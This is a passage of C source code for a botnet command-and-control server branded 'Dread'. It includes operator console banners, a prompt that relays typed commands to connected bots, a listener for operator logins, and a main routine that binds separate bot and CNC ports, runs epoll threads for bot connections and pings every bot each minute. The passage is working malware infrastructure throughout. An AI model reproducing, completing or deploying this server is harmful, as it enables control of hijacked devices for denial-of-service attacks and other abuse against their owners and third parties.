            sprintf(x2logout_message4, "\033[1;91m                    ██\033[1;90m╔══\033[1;91m██\033[1;90m╗\033[1;91m██\033[1;90m╔══\033[1;91m██\033[1;90m╗\033[1;91m██\033[1;90m╔════╝\033[1;91m██\033[1;90m╔══\033[1;91m██\033[1;90m╗\033[1;91m██\033[1;90m╔══\033[1;91m██\033[1;90m╗\r\n");
            sprintf(x2logout_message5, "\033[1;91m\r\n");
            sprintf(x2logout_message6, "\033[1;91m\r\n");
            sprintf(x2logout_message7, "\033[1;91m\r\n");
            sprintf(x2logout_message8, "\033[1;91m\r\n");
            sprintf(x2logout_message9, "\033[1;91m\r\n");
        
            if (send(datafd, x2logout_message1, strlen(x2logout_message1), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, x2logout_message2, strlen(x2logout_message2), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, x2logout_message3, strlen(x2logout_message3), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, x2logout_message4, strlen(x2logout_message4), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, x2logout_message5, strlen(x2logout_message5), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, x2logout_message6, strlen(x2logout_message6), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, x2logout_message7, strlen(x2logout_message7), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, x2logout_message8, strlen(x2logout_message8), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, x2logout_message9, strlen(x2logout_message9), MSG_NOSIGNAL) == -1) goto end;
            sleep(1);
            sprintf(clearscreen, "\033[2J\033[1;1H");
        
            char x1logout_message1[800];
            char x1logout_message2[800];
            char x1logout_message3[800];
            char x1logout_message4[800];
            char x1logout_message5[800];
            char x1logout_message6[800];
            char x1logout_message7[800];
            char x1logout_message8[800];
            char x1logout_message9[800];
        
            sprintf(x1logout_message1, "\033[1;90m\033[2J\033[1;1H");
            sprintf(x1logout_message2, "\033[1;90m\r\n");
            sprintf(x1logout_message3, "\033[1;90m                    ██████\033[038;5;250m╗\033[1;90m ██████\033[038;5;250m╗ \033[1;90m███████\033[038;5;250m╗ \033[1;90m█████\033[038;5;250m╗ \033[1;90m██████\033[038;5;250m╗ \r\n");
            sprintf(x1logout_message4, "\033[1;90m\r\n");
            sprintf(x1logout_message5, "\033[1;90m\r\n");
            sprintf(x1logout_message6, "\033[1;90m\r\n");
            sprintf(x1logout_message7, "\033[1;90m\r\n");
            sprintf(x1logout_message8, "\033[1;90m\r\n");
            sprintf(x1logout_message9, "\033[1;90m\r\n");
        
            if (send(datafd, x1logout_message1, strlen(x1logout_message1), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, x1logout_message2, strlen(x1logout_message2), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, x1logout_message3, strlen(x1logout_message3), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, x1logout_message4, strlen(x1logout_message4), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, x1logout_message5, strlen(x1logout_message5), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, x1logout_message6, strlen(x1logout_message6), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, x1logout_message7, strlen(x1logout_message7), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, x1logout_message8, strlen(x1logout_message8), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, x1logout_message9, strlen(x1logout_message9), MSG_NOSIGNAL) == -1) goto end;
            sleep(1);
            sprintf(clearscreen, "\033[2J\033[1;1H");
            sleep(2);
            goto end;
        }

        trim(buf);
        char input[800];
        sprintf(input, "\033[1;90m%s\033[38;5;250m@\033[1;90mDread\033[38;5;250m >\033[1;37m ", uname);
        if (send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
        if (strlen(buf) == 0) continue;
        broadcast(buf, datafd, accounts[find_line].username);
        memset(buf, 0, 2048);
    }

    end:
    managements[datafd].connected = 0;
    close(datafd);
    OperatorsConnected--;
}

void *BotListener(int port) {
    #define safeString "\x65\x6C\x61\x20\x69\x73\x20\x62\x61\x73\x65\x64\x20\x61\x6E\x64\x20\x62\x6F\x74\x70\x69\x6C\x6C\x65\x64";
    int sockfd, newsockfd;
    socklen_t clilen;
    struct sockaddr_in serv_addr, cli_addr;
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) perror("ERROR opening socket");
    bzero((char *) &serv_addr, sizeof(serv_addr));
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_addr.s_addr = INADDR_ANY;
    serv_addr.sin_port = htons(port);
    if (bind(sockfd, (struct sockaddr *) &serv_addr, sizeof(serv_addr)) < 0) perror("ERROR on binding");
    listen(sockfd, 5);
    clilen = sizeof(cli_addr);
    while (1) {
        newsockfd = accept(sockfd, (struct sockaddr *) &cli_addr, &clilen);
        if (newsockfd < 0) perror("ERROR on accept");
        pthread_t thread;
        pthread_create(&thread, NULL, &BotWorker, (void *) newsockfd);
    }
}

int main(int argc, char *argv[], void *sock) {
    signal(SIGPIPE, SIG_IGN);
    int s, threads, port;
    struct epoll_event event;
    if (argc != 4) {
        fprintf(stderr, "Usage ~> ./%s <BOT-PORT> <THREADS> <CNC-PORT>\n", argv[0]);
        exit(EXIT_FAILURE);
    }
    port = atoi(argv[3]);
    threads = atoi(argv[2]);
    printf("\033[1;90m[\033[38;5;250mCNC Online\033[1;90m]\n");
    listenFD = create_and_bind(argv[1]);
    if (listenFD == -1) abort();
    s = make_socket_non_blocking(listenFD);
    if (s == -1) abort();
    s = listen(listenFD, SOMAXCONN);
    if (s == -1) {
        perror("listen");
        abort();
    }
    epollFD = epoll_create1(0);
    if (epollFD == -1) {
        perror("epoll_create");
        abort();
    }
    event.data.fd = listenFD;
    event.events = EPOLLIN | EPOLLET;
    s = epoll_ctl(epollFD, EPOLL_CTL_ADD, listenFD, &event);
    if (s == -1) {
        perror("epoll_ctl");
        abort();
    }
    pthread_t thread[threads + 2];
    while (threads--) {
        pthread_create(&thread[threads + 1], NULL, &BotEventLoop, (void *) NULL);
    }
    pthread_create(&thread[0], NULL, &BotListener, port);
    while (1) {
        broadcast("PING", -1, "\033[38;5;250mDread");
        sleep(60);
    }
    close(listenFD);
    return EXIT_SUCCESS;
}
